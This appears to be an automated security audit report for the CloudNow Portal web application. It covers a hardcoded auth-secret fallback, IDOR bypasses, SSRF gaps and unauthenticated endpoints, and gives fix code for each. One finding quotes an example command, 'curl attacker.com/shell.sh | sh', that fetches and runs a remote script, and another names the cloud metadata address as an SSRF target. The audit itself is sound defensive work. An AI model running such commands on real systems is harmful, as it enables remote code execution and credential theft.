# Security Review — CloudNow Portal

**Date**: 2026-02-19
**Reviewer**: security-auditor agent
**Scope**: Full codebase security audit — OWASP Top 10, RBAC, input validation, secrets, auth, webhooks, MCP, workflows

## Summary

The codebase has a **solid security posture overall** with consistent auth checks, proper SSRF prevention, LIKE injection escaping, and Zod input validation on routes. However, there are **2 high-severity IDOR bypass paths** in the chat approval flow and MCP admin routes, plus a **critical secret management weakness** where `BETTER_AUTH_SECRET` can silently fall back to a hardcoded value in production. SQL injection audit of all Oracle repositories found **zero vulnerabilities** — bind parameters are used consistently throughout.

## Findings

### CRITICAL: `BETTER_AUTH_SECRET` hardcoded fallback can silently run in production

- **File**: `packages/server/src/auth/config.ts:102`
- **Description**: The auth secret uses a hardcoded fallback: `process.env.BETTER_AUTH_SECRET || 'dev-build-only-secret'`. The runtime check in `apps/frontend/src/hooks.server.ts:23-24` only **logs an error** (`log.error(...)`) but does **not throw or halt startup**. This means production can silently run with the known secret `'dev-build-only-secret'`.
- **Risk**: An attacker who knows this default can forge session tokens and decrypt AES-256-GCM encrypted webhook secrets (which derive their key from `BETTER_AUTH_SECRET`). Complete auth bypass + credential exposure.
- **Fix**: Change `hooks.server.ts:23-24` to `throw new Error(...)` instead of `log.error(...)`, or add a startup guard in the Fastify API server that refuses to start without `BETTER_AUTH_SECRET` in production mode. The Fastify API (`apps/api`) has no equivalent runtime check at all — add one in the app factory.

---

### HIGH: Chat approval IDOR guard is conditionally bypassed

- **File**: `apps/api/src/routes/chat.ts:167-184`
- **Description**: The IDOR guard for the `approval` intent is behind a triple conditional: `if (fastify.hasDecorator('oracle') && fastify.oracle.isAvailable() && orgId)`. If any condition is false (Oracle temporarily unavailable, user has no active org), the code **falls through** and resumes the workflow at line 185 without any ownership verification. The `targetRunId` comes from LLM intent classification of user-supplied text — an attacker could craft a message that tricks the classifier into returning another user's run ID.
- **Risk**: An authenticated user without org context (or during a DB outage) could resume/approve any workflow run belonging to any org by manipulating the chat message to produce a target runId.
- **Fix**: Make the IDOR check mandatory. If the check cannot be performed (Oracle down or no orgId), deny the operation:
  ```typescript
  if (!orgId || !fastify.hasDecorator('oracle') || !fastify.oracle.isAvailable()) {
      // Cannot verify ownership — deny
      clearTimeout(timeout);
      reply.raw.writeHead(403, { 'Content-Type': 'application/json' });
      reply.raw.write(JSON.stringify({ error: 'Cannot verify workflow ownership' }));
      reply.raw.end();
      return;
  }
  ```

---

### HIGH: MCP admin routes bypass IDOR check when orgId is null

- **File**: `apps/api/src/routes/admin/mcp.ts` — lines 209-212, 328-330, 375-377, 436-438, 481-484, 527-529, 576-582, 628-631, 675-680, 720-726, 800-806, 849-853
- **Description**: Every MCP admin endpoint follows the pattern:
  ```typescript
  const orgId = resolveOrgId(request);
  // ...
  if (orgId && existing.orgId !== orgId) {
      throw new NotFoundError(...);
  }
  ```
  The `if (orgId && ...)` guard means that when `orgId` is `null` (admin user without an active organization selected), the ownership check is **entirely skipped**. An admin who hasn't selected an org can read, modify, delete, and connect to MCP servers belonging to **any organization**, including decrypted credentials (GET `/api/admin/mcp/servers/:id` returns credentials).
- **Risk**: Cross-tenant data access. An admin in Org A could access Org B's MCP server credentials, connect to arbitrary servers, or delete them. In a multi-tenant deployment this is a serious isolation breach.
- **Fix**: Require orgId to be non-null for all org-scoped operations. Change the pattern to:
  ```typescript
  const orgId = resolveOrgId(request);
  if (!orgId) throw new ValidationError('Organization context required');
  if (existing.orgId !== orgId) throw new NotFoundError(...);
  ```

---

### MEDIUM: Session continue endpoint allows access to legacy sessions with null userId

- **File**: `apps/api/src/routes/sessions.ts:217`
- **Description**: The session ownership check is: `if (session.userId && session.userId !== userId)`. Legacy sessions created before user tracking have `userId = null`, causing the condition to short-circuit to false. Any authenticated user can continue/switch to any legacy session.
- **Risk**: An authenticated user could hijack orphaned sessions, potentially accessing conversation history or session state from other users.
- **Fix**: Invert the logic to deny by default:
  ```typescript
  if (!session.userId || session.userId !== userId) {
      return reply.status(403).send({ error: 'Forbidden', message: 'Session does not belong to you' });
  }
  ```

---

### MEDIUM: Health endpoint exposes subsystem details without authentication

- **File**: `apps/api/src/routes/health.ts:21-43`
- **Description**: The deep health check at `/health` and `/api/health` is **unauthenticated** and returns detailed subsystem statuses including Oracle DB connectivity, component names, and error messages.
- **Risk**: Information disclosure — an attacker can enumerate which subsystems are running, discover infrastructure details, and detect outages for timing attacks.
- **Fix**: Keep `/healthz` as the lightweight unauthenticated liveness probe. Move `/health` (deep check) behind `requireAuth('admin:all')` or restrict to internal network only via middleware.

---

### MEDIUM: MCP server HTTP/SSE URLs not validated for SSRF

- **File**: `apps/api/src/services/mcp-connection-manager.ts:631-658`
- **Description**: When building MCP client configs for HTTP/SSE transport, `server.config.url` is passed directly to `new URL(server.config.url)` without SSRF validation. Unlike webhook URLs which go through `isValidWebhookUrl()` → `isValidExternalUrl()` with DNS rebinding protection, MCP server URLs have **no private IP blocking**.
- **Risk**: An admin user could configure an MCP server pointing to `https://169.254.169.254/...` (cloud metadata), `https://internal-service.internal/...`, or a private IP to perform SSRF from the server.
- **Fix**: Validate MCP HTTP/SSE URLs through `isValidExternalUrl()` before connecting:
  ```typescript
  if (server.transportType !== 'stdio') {
      const { isValidExternalUrl } = await import('@portal/server/url-validation.js');
      if (!(await isValidExternalUrl(server.config.url))) {
          throw new Error(`MCP server URL blocked by SSRF filter: ${server.config.url}`);
      }
  }
  ```

---

### MEDIUM: MCP stdio transport allows arbitrary command execution

- **File**: `apps/api/src/services/mcp-connection-manager.ts:626-629`
- **Description**: The stdio transport config passes `server.config.command` and `server.config.args` directly from the database record to `InternalMastraMCPClient`. While this is behind `admin:all` permission, there is no validation or allowlist on the command path. An admin could set `command: '/bin/sh'` with args `['-c', 'curl attacker.com/shell.sh | sh']`.
- **Risk**: Remote code execution on the API server by any admin user. Combined with the MCP admin IDOR finding above, a user without org context could potentially create an MCP server with a malicious command.
- **Fix**: Implement a command allowlist (e.g., `['npx', 'node', 'uvx', 'python3']`) and validate that args don't contain shell metacharacters. At minimum, validate `command` against a regex like `/^[a-z0-9/_.-]+$/i`.

---

### MEDIUM: Setup AI provider test endpoint has no authentication

- **File**: `apps/api/src/routes/setup.ts:305-357`
- **Description**: The `POST /api/setup/ai-provider/test` endpoint has **no `preHandler` authentication** — neither `requireAuth()` nor `requireSetupToken`. The only guard is checking `isSetupComplete()` (line 317), which returns true after initial setup. Before setup is complete, this endpoint is fully unauthenticated and accessible to anyone. Other setup endpoints (e.g., `/api/setup/settings` at line 363) properly use `preHandler: requireSetupToken`.
- **Risk**: During the setup window (before initial configuration is finalized), an unauthenticated attacker can probe AI provider types and validate API key formats, potentially leaking information about which providers are configured.
- **Fix**: Add `preHandler: requireSetupToken` to match the other setup endpoints:
  ```typescript
  app.post('/api/setup/ai-provider/test', {
      preHandler: requireSetupToken,
      schema: { body: TestAiProviderInputSchema, ... }
  }, async (request, reply) => { ... });
  ```

---

### MEDIUM: CloudAdvisor analysis endpoint missing org scoping

- **File**: `apps/api/src/routes/cloud-advisor.ts:75-93`
- **Description**: The `POST /api/cloud-advisor/analyse` endpoint requires `tools:execute` permission but does **not call `resolveOrgId()`**. The `triggerAnalysis()` function receives `mastra.defaultCompartmentId` (a hardcoded OCI compartment) instead of the user's org context. Findings from the analysis are stored without org scoping.
- **Risk**: Cross-org data pollution — analysis findings may be visible to users from other organizations, or findings from one org's compartment could be attributed to another.
- **Fix**: Add org scoping:
  ```typescript
  const orgId = resolveOrgId(request);
  if (!orgId) return reply.code(400).send({ error: 'Organization context required' });
  const runId = await triggerAnalysis(schedulerConfig, domain, depth, orgId);
  ```

---

### MEDIUM: Session refresh doesn't invalidate on org membership revocation

- **File**: `packages/server/src/auth/config.ts:170-173`
- **Description**: Sessions have a 30-day expiry with 24-hour refresh (`updateAge: 60 * 60 * 24`). When a user's org membership is revoked or their role is downgraded, the existing session token remains valid until the next refresh cycle (up to 24 hours). The auth plugin (`apps/api/src/plugins/auth.ts:94`) resolves the session once at request start and caches the role; mid-session changes are not detected.
- **Risk**: A revoked admin retains admin-level access for up to 24 hours after removal.
- **Fix**: Reduce `updateAge` to 1 hour for tighter enforcement. Consider implementing immediate session invalidation when org membership changes by flagging the session in the database and checking the flag in the auth plugin's `onRequest` hook.

---

### LOW: AI provider routes not org-scoped (global resource)

- **File**: `apps/api/src/routes/admin/ai-providers.ts:52-62`
- **Description**: AI provider CRUD operations (`list`, `create`, `update`, `delete`) require `admin:all` but are **not scoped by organization**. All AI providers are global and any admin from any org can modify them.
- **Risk**: In a multi-tenant deployment, an admin in one org could delete or modify AI providers used by other orgs.
- **Fix**: Either scope AI providers to organizations (add `orgId` column) or document this as intentionally global with appropriate admin trust boundaries.

---

### LOW: CORS origin passed as single string value

- **File**: `apps/api/src/plugins/cors.ts:11`
- **Description**: CORS origin is set from `opts.corsOrigin` as a single string value. If this is `*` or overly broad in production, it could allow cross-origin credential theft. The current implementation delegates to `@fastify/cors` which handles the `origin` option correctly, but the security depends entirely on the runtime configuration value.
- **Risk**: If misconfigured, cross-origin requests could access authenticated endpoints.
- **Fix**: Validate that `corsOrigin` is not `*` in production mode. Add a startup guard:
  ```typescript
  if (process.env.NODE_ENV === 'production' && opts.corsOrigin === '*') {
      throw new Error('CORS origin must not be wildcard in production');
  }
  ```

---

## SQL Injection Audit (Separate Deep Scan)

A dedicated audit of **all Oracle repository files** found **zero SQL injection vulnerabilities**:

- **14 repository files scanned** across `packages/server/src/oracle/repositories/`, `packages/server/src/auth/oracle-adapter.ts`, `packages/server/src/admin/mcp-repository.ts`, `apps/api/src/mastra/storage/oracle-store.ts`, `apps/api/src/mastra/rag/oracle-vector-store.ts`, `apps/api/src/services/workflow-repository.ts`
- **100% bind parameter coverage** for all user-controlled values
- **Dynamic identifiers validated** via `validateColumnName()` (regex: `/^[a-z_][a-z0-9_]{0,127}$/`) and `validateTableName()` (allowlist)
- **LIKE clauses properly escaped** with `%`, `_`, `\` replacement + `ESCAPE '\\'` clause
- **Metadata JSON path keys validated** with strict regex before interpolation in `oracle-vector-store.ts` and `oracle-store.ts`
- **Numeric batch sizes validated** to integer range [1, 1000] before template literal use in `webhook-repository.ts`

---

## Positive Findings (Reviewed, No Issues)

| Area | Status | Notes |
|------|--------|-------|
| **Webhook SSRF prevention** | Solid | `isValidExternalUrl()` checks private IPs, loopback, cloud metadata, DNS rebinding via `ipaddr.js`. HTTPS required. |
| **Webhook HMAC signing** | Solid | `crypto.timingSafeEqual` for signature verification. SHA-256 with per-webhook secret. |
| **LIKE injection escaping** | Solid | Both `session-repository.ts:223` and `workflow-repository.ts:361` properly escape `%`, `_`, `\` with `ESCAPE '\\'` clause. Oracle adapter also has `escapeLikeValue()`. |
| **SQL bind parameters** | Solid | All Oracle queries use `:paramName` bind variables. No string interpolation of user input into SQL observed in repositories. |
| **Zod input validation** | Solid | All route handlers use Zod schemas for request validation (body, params, querystring). |
| **RBAC on all non-health routes** | Solid | Every route handler uses `requireAuth(permission)` as preHandler. |
| **Workflow IDOR fixes (approve/reject)** | Solid | `workflows.ts:1138-1141` and `1178-1181` use `getByIdForUser(runId, userId, orgId)` — proper mandatory IDOR guard. |
| **Docker image validation** | Solid | `mcp-connection-manager.ts:510-513` validates image names against `/^[a-z0-9._/-]+$/` and tags against `/^[a-zA-Z0-9._-]+$/`. |
| **Cookie security** | Solid | `httpOnly: true`, `secure` in production, `sameSite: lax` by default, with `SameSite=None` requiring `Secure`. |
| **Session timeout** | Acceptable | 30-day session expiry with 24h refresh. Long but configurable. |
| **Rate limiting** | Solid | Dual-layer: in-memory + Oracle-backed. Per-user/key/IP tracking. Fail-open on DB errors (acceptable for availability). |
| **Error responses** | Solid | `toPortalError()` → `toResponseBody()` strips internal details. Pino redacts auth headers. |
| **Tool approval system** | Solid | Server-side `consumeApproval()` prevents client-side bypass. Single-use tokens. |
